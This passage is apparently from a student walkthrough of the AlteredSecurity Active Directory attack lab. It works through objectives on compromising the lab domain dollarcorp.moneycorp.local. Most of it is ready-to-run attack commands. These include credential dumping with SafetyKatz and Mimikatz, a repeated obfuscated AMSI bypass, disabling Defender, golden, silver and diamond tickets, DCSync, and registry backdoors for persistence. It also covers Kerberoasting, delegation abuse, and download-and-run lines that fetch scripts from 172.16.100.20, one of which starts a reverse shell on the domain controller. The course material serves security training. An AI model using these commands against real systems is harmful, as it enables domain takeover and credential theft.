portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.20\"Note that the $null variable is used to address output redirection issues. Use loader.exe to download and execute SafetyKatz.exe in memory on the dcorp-mgmt machine with this command on the reverse shell$null | winrs -r:dcorp-mgmt C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exitTo do it with powershell remoting, first check we can run commands on the dcorp-mgmt machine withInvoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-mgmtThen we’ll use Invoke-Mimi.ps1. Start by hosting it on your machine and running this on the reverse shelliex (iwr http://172.16.100.20/Invoke-Mimi.ps1 -UseBasicParsing)Then we need to disable AMSI on the dcorp-mgmt machine, we can do the AMSI bypass shown earlier or use the built in Set-MpPreference as well because we are admins on the dcorp-mgmt machine.$sess = New-PsSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.localInvoke-Command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sessInvoke-Command -ScriptBlock ${function:Invoke-Mimi} -Session $sessUsing Rubeus:C:\\AD\\Tools\\Rubeus.exe asktgt /user:svcadmin /aes256:&lt;aes256 hash&gt; /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe /show /pttWill open a new process, which we can access the domain controller usingwinrs -r:dcorp-dc whoamiNow we need to escalate to domain admin using derivative local admin. Let’s find out the machines which we have local admin privileges by loading a powershell session with invisishell and enter the following commandsPS C:\\AD\\Tools&gt; . C:\\AD\\Tools\\Find-PSRemotingLocalAdminAccess.ps1PS C:\\AD\\Tools&gt; Find-PSRemotingLocalAdminAccessWe have local admin on the dcorp-adminsrv, but any attempt to run loader.exe results in error ‘this program is blocked by group policy’, and any attempts to run invoke-mimi results in errors about language mode. This is because we are dropped into Constrained Language Mode when using PSRemoting. We can check if applocker is configured on dcorp-adminsrv by querying registry keys.winrs -r:dcorp-adminsrv cmdreg query HKLM\\Software\\Policies\\Microsft\\Windows\\SRPV2and it looks like applocker is configured. Going through the policies will show that only Microsoft signed binaries and scripts are allowed, however there is a certain rule that is overly permissive.C:\\Users\\studentx&gt;reg queryHKLM\\Software\\Policies\\Microsoft\\Windows\\SRPV2\\Script\\06dce67b-934c-454fa263-2515c8796a5dreg query HKLM\\Software\\Policies\\Microsoft\\Windows\\SRPV2\\Script\\06dce67b934c-454f-a263-2515c8796a5dAlteredSecurity Attacking and Defending Active Directory 41HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\SRPV2\\Script\\06dce67b934c-454f-a263-2515c8796a5d Value REG_SZ &lt;FilePathRule Id=\"06dce67b-934c-454f-a263-2515c8796a5d\" Name=\"(Default Rule) All scripts located in the Program Filesfolder\" Description=\"Allows members of the Everyone group to run scripts thatare located in the Program Files folder.\" UserOrGroupSid=\"S-1-1-0\"Action=\"Allow\"&gt;&lt;Conditions&gt;&lt;FilePathConditionPath=\"%PROGRAMFILES%\\*\"/&gt;&lt;/Conditions&gt;&lt;/FilePathRule&gt;A default rule is enabled that allows everyone to run scripts from the C:\\Program Files\\ Folder. We can also confirm this using powershell as suchEnter-PSSession dcorp-adminsrv$ExecutionContext.SessionState.LanguageModeGet-AppLockerPolicy -Effective | select -ExpandProperty RuleCollectionsWe can drop scripts in the Program Files directory and execute them from there, but we’ll need to disable defender first using Set-MpPreference -DisableRealtimeMonitoring $true -VerboseAlso, because we can not . source scripts because of the CLM, we must modify Invoke-Mimi.ps1 to include the function call in the script itself and transfer the modified script to the target server.Create Invoke-MimiEx.ps1 Create a copy of Invoke-Mimi.ps1 and rename it to Invoke-MimiEx.ps1. Open Invoke-MimiEx.ps1 in PowerShell ISE (Right click on it and click Edit). Add “Invoke-Mimi -Command ‘“sekurlsa::ekeys”’ “ (without quotes) to the end of the file.Then run this command to copy it to the target machineCopy-Item C:\\AD\\Tools\\Invoke-MimiEx.ps1 \\\\dcorpadminsrv.dollarcorp.moneycorp.local\\c$\\'Program Files'Then run the script without . sourcing as such.\\Invoke-MimiEx.ps1And we can get credentials for srvadmin, appadmin, and websvc users. From local system (as admin) we can overpass the hash using safetykatz:C:\\AD\\Tools\\SafetyKatz.exe \"sekurlsa::pth /user:srvadmin/domain:dollarcorp.moneycorp.local/aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4/run:cmd.exe\" \"exit\"The new process spawned has srvadmin privileges, we can check if srvadmin has admin privileges on other machines as such:C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat. C:\\AD\\Tools\\Find-PSRemotingLocalAdminAccess.ps1Find-PSRemotingLocalAdminAccess -VerboseAnd we will see that we have local admin access on the dcorp-mgmt as srvadmin, which we know already has a session of svcadmin. We can use SafetyKatz to extract more credentials from the machine. Run the below commands from the process running as srvadmin. First copy the loader to dcorp-mgmt: echo F | xcopy C:\\AD\\Tools\\Loader.exe \\\\dcorpmgmt\\C$\\Users\\Public\\Loader.exeextract the credentials:winrs -r:dcorp-mgmt cmd&gt;C:\\Users\\Public\\Loader.exe -pathhttp://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exitWe can also use Invoke-Mimi with PSRemoting as suchEnter-PSSession -ComputerName dcorp-mgmtAnd then disable AMSI using the “set item” blob. then download and execute InvokeMimi as followingiex (iwr http://172.16.100.X/Invoke-Mimi.ps1 -UseBasicParsing)Invoke-Mimi -Command '\"sekurlsa::ekeys\"'We can also use Invoke-Mimi to look for credentials from the credentials vault, sometimes interesting credentials like those used for scheduled tasks will be stored here. You can do this as such:Invoke-Mimi -Command '\"token::elevate\" \"vault::cred /patch\"'Finally, we can use the svcadmin credentials on the student VM using OverPasstheHaash as such:&gt; C:\\AD\\Tools\\Rubeus.exe asktgt /user:svcadmin/aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011/opsec /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt And the new process wil start with the privileges of SVCadmin.Learning Objective 8In this learning objective we will extract secrets from the DC of dollarcorp, using the secrets of KRBTGT account to make a golden ticket, and use the golden ticket to get domain admin privileges from a machine.Using SafetyKatz.exeRun the below command from an admin cmd prompt to start a process with DA privileges:C:\\AD\\Tools\\Rubeus.exe asktgt /user:svcadmin/aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011/opsec /createnetonly:C:\\Windows\\System32\\cmd.exe /show /pttThen run the below commands from the process running as DA to copy loader.exe onto the DC and use it to extract credentialsecho F | xcopy C:\\AD\\Tools\\Loader.exe \\\\dcorp-dc\\C$\\Users\\Public\\Loader.exe /Ywinrs -r:dcorp-dc cmdnetsh interface portproxy add v4tov4 listenport=8080listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.20C:\\Users\\Public\\Loader.exe -pathhttp://127.0.0.1:8080/SafetyKatz.exelsadump::lsa /patchor, to get the NTLM hash and AES keys of the krbtgt account, we can use the DCSync attack as follows from the DA process:C:\\AD\\Tools\\SafetyKatz.exe \"lsadump::dcsync/user:dcorp\\krbtgt\" \"exit\"Finally, we can use BetterSafetyKatz.exe to create a golden ticket as suchC:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648/aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt\" \"exit\"klist (will show cached ticket with client: Administrator)dir \\\\dcorp-dc\\c$Using Powershell remoting and Invoke-Mimi.ps1Start a process with domain admin privileges and run the below command from an elevated shell:C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat. C:\\AD\\Tools\\Invoke-Mimi.ps1Invoke-Mimi -Command '\"sekurlsa::pth /user:svcadmin/domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8/run:cmd.exe\"'Then run the below commands in the process running as DAC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.batcd C:\\AD\\Tools$sess = New-PSSession -ComputerName dcorp-dcEnter-PSSession $sessS`eT-It`em ( 'V'+'aR' + 'IA' +('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( \"{1}{0}\"-F'F','rE' ) ) ; (Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL ).\"A`ss`Embly\".\"GET`TY`Pe\"((\"{6}{3}{1}{4}{2}{0}{5}\" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) ).\"g`etf`iElD\"( ( \"{0}{2}{1}\" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( \"{2}{4}{0}{1}{3}\" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' )).\"sE`T`VaLUE\"(${n`ULl},${t`RuE} )exitInvoke-Command -FilePath .\\Invoke-Mimi.ps1 -Session $sessEnter-PSSession $sessInvoke-Mimi -Command '\"lsadump::lsa /patch\"'We can also run DCSync from the process running as DA as such:Invoke-Mimi -Command '\"lsadump::dcsync /user:dcorp\\krbtgt\"'And create the golden ticket with:Invoke-Mimi -Command '\"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid: S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt\"'and check withls \\\\dcorp-dc \\c$We can also run WMI commands on the DCgwmi -Class win32_computersystem -ComputerName dcorp-dcLearning Objective 9Objective: Get command execution on the domain controller by creating silver ticket for Host service and WMI. From the information gathered in the previous objective, we have the hash for the machine account of the domain controller (dcorp-dc$). Using the below command we can create a Silver Ticket that provides us access to the HOST service of the DC. Run this command from an elevated shell:C:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid: S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:98fb9b154f614d933422b877cd3f2e98 /startoffset:0 /endin:600 /renewmax:10080 /ptt\" \"exit\"Or you can use Invoke-Mimi for the same results using:Invoke-Mimi -Command '\"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:98fb9b154f614d933422b877cd3f2e98 /startoffset:0 /endin:600 /renewmax:10080 /ptt\"'In either case, you should see Golden ticket for 'Administrator @ dollarcorp.moneycorp.local successfully submitted for current session.We can then start a listener and schedule a task to run the reverse shell script using Invoke-PowerShellTcpEx.ps1. First create a copy of Invoke-PowerShellTcp.ps1 and rename it Invoke-PowerShellTcpEx.ps1 and add the function call Power -Reverse -IPAddress 172.16.100.20 -Port 443 to the end of the file. Then run the below command in the process where we injected the ticket for the HOST service. Make sure your listener is already running.schtasks /create /S dcorp-dc /SC Weekly /RU \"NT Authority\\SYSTEM\" /TN \"User520\" /TR \"powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.20/InvokePowerShellTcpEx.ps1''')'\"schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN\"User520\"To access WMI, we need to create two tickets, one for the HOST service and another for RPCSS. run the below commands from an elevated shell.C:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden/User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local/service:HOST /rc4:98fb9b154f614d933422b877cd3f2e98 /startoffset:0 /endin:600/renewmax:10080 /ptt\" \"exit\"Inject a ticket for RPCSS:C:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden/User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local/service:RPCSS /rc4:98fb9b154f614d933422b877cd3f2e98 /startoffset:0/endin:600 /renewmax:10080 /ptt\" \"exit\"Check if the ticket is present with klist and look for Server:RPCSS/dcorp-dc.dollarcorp.moneycorp.local and HOST/dcorp-dc.dollarcorp.moneycorp.localNow run the WMI commands on the domain controller:C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.batGet-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dcLearning Objective 10We will use the domain admin prviliges obtained earlier to execute a Diamond Ticket attack. We can use Rubeus to execute the attack from cmd (run as admin)C:\\AD\\Tools\\Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator/domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\\Windows\\System32\\cmd.exe /show /pttThen access the DC using winrs from the new spawned process:winrs -r:dcorp-dc cmdLearning Objetive 11Using DA privileges obtained earlier to abuse the DSRM credential for persistence. We can do this by opening a remote powershell session, or other tools like SafetyKatz, BetterSafetyKatz, etc.PS C:\\AD\\Tools\\&gt; $sess = New-PSSession dcorp-dcPS C:\\AD\\Tools\\&gt; Enter-PSSession -Session $sess[dcorp-dc]: PS C:\\Users\\svcadmin\\Documents&gt; S`eT-It`em ( 'V'+'aR' + 'IA' +('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( \"{1}{0}\"-F'F','rE' ) ) ; (Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL ).\"A`ss`Embly\".\"GET`TY`Pe\"((\"{6}{3}{1}{4}{2}{0}{5}\" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) ).\"g`etf`iElD\"( ( \"{0}{2}{1}\" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( \"{2}{4}{0}{1}{3}\" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' )).\"sE`T`VaLUE\"(${n`ULl},${t`RuE} )[dcorp-dc]: PS C:\\Users\\svcadmin\\Documents&gt;exitThen load the Invoke-Mimi script in the session:Invoke-Command -FilePath C:\\AD\\Tools\\Invoke-Mimi.ps1 -Session $sessThen we will extract the SAM file from the DC. The Directory Services Restore Mode pasword is mapped to the local admin on the DC.Enter-PSSession -Session $sessInvoke-Mimi -Command '\"token::elevate\" \"lsadump::sam\"'The DSRM admin is not allowed to logon to the DC from the network, so we can chagne the logon behavior for the account by modifying the registry on the DC as shown:New-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name \"DsrmAdminLogonBehavior\" -Value 2 -PropertyType DWORDThen from our local system we can pass the NTLM hash for the DSRM administrator and access the dc from our new session:Invoke-Mimi -Command '\"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe\"'ls \\\\dcorp-dc.dollarcorp.moneycorp.local\\c$Learning Objective 12In this objective we will be checking if our user has DCSync (replication) rights. If so, we will execute the DCsync attack to pull hashes and AES keys of krbtgt user, if not, we will add the replication rights for our user and then perform the attack.We can check if we have replication rights using the following commands, where student520 is the username we want to checkC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat[snip]. C:\\AD\\Tools\\PowerView.ps1Get-DomainObjectAcl -SearchBase \"DC=dollarcorp,DC=moneycorp,DC=local\" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} |?{$_.IdentityName -match \"student520\"}If we do not have the rights, we can add the rights by first starting a process as Domain Admin by running the below command from an elevated command prompt:C:\\AD\\Tools\\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe /show /pttThen run the below commands in the process spawned by rubeus to add the rights:C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat. C:\\AD\\Tools\\PowerView.ps1Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student520 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local - TargetDomain dollarcorp.moneycorp.local -VerboseThen check for rights again using the previous Get-DomainObjectAcl command, you should be looking for these strings to have AccessAllowedObjectAceType : DS-Replication-Get-Changes-In-Filtered-SetObjectAceType : DS-Replication-Get-ChangesObjectAceType : DS-Replication-Get-Changes-AllWe can then use SafetyKatz.exe to get the hashes of the krbtgt or any other user, as the DC contains all the user’s secrets in the domainC:\\AD\\Tools\\SafetyKatz.exe \"lsadump::dcsync /user:dcorp\\krbtgt\" \"exit\"Learning Objective 13In this objective we will be modifying security descriptors on the domain controller to get access using PowerShell remoting and WMI without requiring administrator access. We will retreive the machine account hash from dcorp-dc without using administrator access and use that to execute a silver ticket attack to get code execution with WMI.Once we have administrative privileges on a machine, we can modify the security descriptors of services to access the services without admin prviliges. Below command (to be run as DA) modifies the host security descriptors for WMI on the DC to allow the student to access WMIC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat. C:\\AD\\Tools\\RACE.ps1Set-RemoteWMI -SamAccountName student520 -ComputerName dcorp-dc -namespace 'root\\cimv2' -VerboseNow we can execute WMI queries on the DC as student520gwmi -class win32_operatingsystem -ComputerName dcorp-dcSimilar modifications can be done to PowerShell remoting configuration:. C:\\AD\\Tools\\RACE.ps1Set-RemotePSRemoting -SamAccountName studentx -ComputerName dcorp-dc.dollarcorp.moneycorp.local -VerboseAnd now we can run commands using powershell remoting on the DC without DA privilegesInvoke-Command -ScriptBlock{whoami} -ComputerName dcorpdc.dollarcorp.moneycorp.localTo retrieve machine account hash without DA, first we need to modify permissions on the DC by running this command as DA: . C:\\AD\\Tools\\RACE.ps1 Add-RemoteRegBackdoor -ComputerName dcorpdc.dollarcorp.moneycorp.local -Trustee student520 -VerboseThen we can retrieve the hash as the student520 user with. C:\\AD\\Tools\\RACE.ps1Get-RemoteMachineAccountHash -ComputerName dcorp-dc -VerboseThe machine account hash can be used to create silver tickets for HOST and RPCSS to execute WMI queries:C:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:1be12164a06b817e834eb437dc8f581c /startoffset:0 /endin:600 /renewmax:10080 /ptt\" \"exit\"C:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:1be12164a06b817e834eb437dc8f581c /startoffset:0 /endin:600 /renewmax:10080 /ptt\" \"exit\"thenC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.batgwmi -Class win32_operatingsystem -ComputerName dcorp-dcLearning Objective 14the task in this objective is using Kerberoasting, get and crack the password of the SQL server service account.We can use PowerView’s Get-DomainUser -SPN or AD module for discovering services running with user accounts, as services running with machine accounts have difficult passwords.C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat. C:\\AD\\Tools\\PowerView.ps1Get-DomainUser -SPNWhich shows in this lab that the svcadmin, who is a DA, has an SPN set which we can kerberoast with rubeus. Note we are using the /rc4opsec option which will only retrieve hashes for accounts that support rc4, if the account supports kerberos AES 128/256 bit encrption, the below command will not request its hashes.C:\\AD\\Tools\\Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\\AD\\Tools\\hashes.txtThen you need to remove :1433 from the SPN in hashes.txt (output file of previous command) before running john, then run the below command to crack it.C:\\AD\\Tools\\john-1.9.0-jumbo-1-win64\\run\\john.exe --wordlist=C:\\AD\\Tools\\kerberoast\\10k-worst-pass.txt C:\\AD\\Tools\\hashes.txtLearning Objective 15Objectives: find a server in the dcorp domain where unconstrained delegation is enabled, comrpromise the server and escalate to DA, escalate to EA by abusing the printer bug.First we will need to find a server that has unconstrained delegation enabledC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat. C:\\AD\\Tools\\PowerView.ps1Get-DomainComputer -Unconstrained | select -ExpandProperty nameSince the prerequiside for elevation using unconstrained delegation is having admin access to the machine, we need to compromise a user who has local admin access on appsrv. Recall that we extracted the secrets of appadmin, srvadmin, and websvc from dcorp-adminsrv. Let’s check if any of them have local admin on dcorp-appsrv. Run the below command from an elevated command prompt:C:\\AD\\Tools\\Loader.exe -Path C:\\AD\\Tools\\SafetyKatz.exe \"sekurlsa::opassth /user:appadmin /domain:dollarcorp.moneycorp.local /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /run:cmd.exe\" \"exitThen run the below commands in the new process:C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat. C:\\AD\\Tools\\Find-PSRemotingLocalAdminAccess.ps1Find-PSRemotingLocalAdminAccessAnd we can see that we have remote local admin access on dcorp-appsrv and dcorp-adminsrv with the appadmin user. We can copy rubeus to the dcorp-appsrv to abuse the printer bug. Run the below from the process running as appadmin:echo F | xcopy C:\\AD\\Tools\\Rubeus.exe \\\\dcorp-appsrv\\C$\\Users\\Public\\Rubeus.exe /YThen run rubeus in Listener modewinrs -r:dcorp-appsrv cmdC:\\Users\\Public\\Rubeus.exe monitor /targetuser:DCORP-DC$ /interval:5 /nowrapOn our student VM, use MS-RPRN to force authentication from the dcC:\\AD\\Tools\\MS-RPRN.exe \\\\dcorp-dc.dollarcorp.moneycorp.local \\\\dcorp-appsrv.dollarcorp.moneycorp.localOn the Rubeus listener, you should see the TGT of dcorp-dc$. Copy the base64 encoded ticket and use it with rubeus on the studentvm, run the below command from an elevated shell as the safetykatz command we will use requires elevation.C:\\AD\\Tools\\Rubeus.exe ptt /ticket:doIFx…Now we can run DCSync from this process:C:\\AD\\Tools\\SafetyKatz.exe \"lsadump::dcsync /user:dcorp\\krbtgt\" \"exit\"Escalation to Enterprise AdminTo get EA privileges, we need to force authentication from mcorp-dc. Run the below command to listen for mcorp-dc$ tickets on the dcorp-appsrvwinrs -r:dcorp-appsrv cmdC:\\Users\\Public\\Rubeus.exe monitor /targetuser:MCORP-DC$ /interval:5 /nowrapThen use MS-RPRN on the student VM to trigger authentication from mcorp-dc to dcorp-appsrvC:\\AD\\Tools\\MS-RPRN.exe \\\\mcorp-dc.moneycorp.local \\\\dcorpappsrv.dollarcorp.moneycorp.localAs previously, copy the base64 encoded ticket and use it with Rubeus on the student VM in an elevated shell.C:\\AD\\Tools\\Rubeus.exe ptt /ticket:doIFx...Now we can run DCSync from the process withC:\\AD\\Tools\\SafetyKatz.exe \"lsadump::dcsync /user:mcorp\\krbtgt /domain:moneycorp.local\" \"exit\"And we can escalate to EA!Learning Objective 16In this objective we will be enumerating users in the domain for whom constrained delegation is enabled, and for such a user we will request a TGT from the DC and obtain a TGS for the service to which delegation is configured, then we will pass the ticket and access the service. In this objective we will also enumerate computer accounts for which constrained delegation is enabled, and request a TGT from the DC, and use the TGS for LDAP service on the target machine, then use the TGS to execute dcsync attack.To enumerate users with constrained delegation, we can use PowerView, Run the below commands to get started after loading a shell with invisishell:. C:\\AD\\Tools\\PowerView.ps1Get-DomainUser -TrustedToAuthSince we already have the secrets for websvc from the dcorp-adminsrv machine, we can use kekeo or rubeus to abuse that as such:C:\\AD\\Tools\\Rubeus.exe s4u /user:websvc/aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:\"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL\" /pttThis command requests a TGS for websvc as the DA, then the TGS is used to access the service specified in the /msdsspn parameter (CIFS/dcorpmssql is the filesystem on the dcorp-mssql machine)Check the ticket with klist, and you should see Client: Administrator @ dollarcorp.moneycorp.local. If so, try accessing the filesystem on dcorp-mssql withdir \\\\dcorp-mssql.dollarcorp.moneycorp.local\\c$Abusing Constrained Delegation with KekeoGo into the x64 keko directory, and we wil use the tgt::ask module from kekeo to request a TGT from websvc, we are using the NTLM hash just to show that NTLM can be used as well.PS C:\\AD\\Tools\\kekeo\\x64&gt; .\\kekeo.exetgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156fNow let’s get this TGT and request a TGS, note that we are requesting a TGS to access cifs/dcorp-mssql as the domain administrator.tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCALYou should see&gt; Ticket in file'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi'Next, inject the ticket in the current session to use it as such:. C:\\AD\\Tools\\Invoke-Mimi.ps1Invoke-Mimi -Command '\"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi\"'Then use the below command to view the contents of the fileshare on dcorp-mssqldir \\\\dcorp-mssql.dollarcorp.moneycorp.local\\c$Enumerating computer accounts with constrained delegation enabled using powerviewGet-DomainComputer -TrustedtoAuthRun the below command with the AES key of dcorp-adminsrv from an elevated command prompt.C:\\AD\\Tools\\Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:1f556f9d4e5fcab7f1bf4730180eb1efd0fadd5bb1b5c1e810149f9016a7284d /impersonateuser:Administrator /msdsspn:time/dcorpdc.dollarcorp.moneycorp.LOCAL /altservice:ldap /pttThen run the below command to abuse the LDAP ticketC:\\AD\\Tools\\SafetyKatz.exe \"lsadump::dcsync /user:dcorp\\krbtgt\" \"exit\"Abusing Constraied Delegation for Machine Accounts using Kekeo.\\kekeo.exetgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291dSince there is no $NAME validation, we can request TGS for time and also LDAP service on dcorp-dc as domain administrator as such:tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCALThen we can use the LDAP ticket as such:. Invoke-Mimi.ps1Invoke-Mimi -Command '\"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi\"'Now using this TGS, we can run DCSync from Mimikatz without DA privileges:Invoke-Mimi -Command '\"lsadump::dcsync /user:dcorp\\krbtgt\"'Learning Objective 17In this objective, we will be finding a computer in the dcorp domain where we have write permissions, then abuse those write permissions to access that computer as DA. We can use PowerView after running invisi-shell to enumerate write permissions for a user that we have compromised. We can try this for multiple users or use bloodhound and we would know that ciadmin has write permissions on the computer object of dcorp-mgmt;Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}Recall that we compromised ciadmin from dcorp-ci. We can use either the reverse shell we have on dcorp-ci as ciadmin or extract the credentials from dcorp-ci. We can use the reverse shell and load powerview on there. Once on the reverse shell as ciadmin on dcorp-ci:iex (iwr http://172.16.100.20/sbloggingbypass.txt -UseBasicParsing) S`eT-It`em ( 'V'+'aR'+ 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( \"{1}{0}\"-F'F','rE' ) ); ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL).\"A`ss`Embly\".\"GET`TY`Pe\"(( \"{6}{3}{1}{4}{2}{0}{5}\" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) ).\"g`etf`iElD\"( ( \"{0}{2}{1}\" -AlteredSecurity Attacking and Defending Active Directory 87f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( \"{2}{4}{0}{1}{3}\" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' )).\"sE`T`VaLUE\"(${n`ULl},${t`RuE} )iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.20/PowerView.ps1'))Now, we set RBCD on dcorp-mgmt for the student VMs in the reverse shell as such:Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-std520$' -Verboseand check that it is set correctly withGet-DomainRBCDwhich should spit out some output showing the sourcename dcorp-mgmt and delegatedname dcorp-std520$from the student VM in an elevated shell, we will get the AES keys using loader.exe to load safetykatz and execute it in memory, then grab the aes256 hmacC:\\AD\\Tools\\Loader.exe -Path C:\\AD\\Tools\\SafetyKatz.exe -Command \"sekurlsa::ekeys\" \"exit\"Then, we can use Rubeus to abuse RBCD to access dcorp-mgmt as DAC:\\AD\\Tools\\Rubeus.exe s4u /user:dcorp-std520$ /aes256:04ec575508fbff957465d31785a6de50d7b3e24a808dc65365f81323d23a11e0 /msdsspn:http/dcorp-mgmt 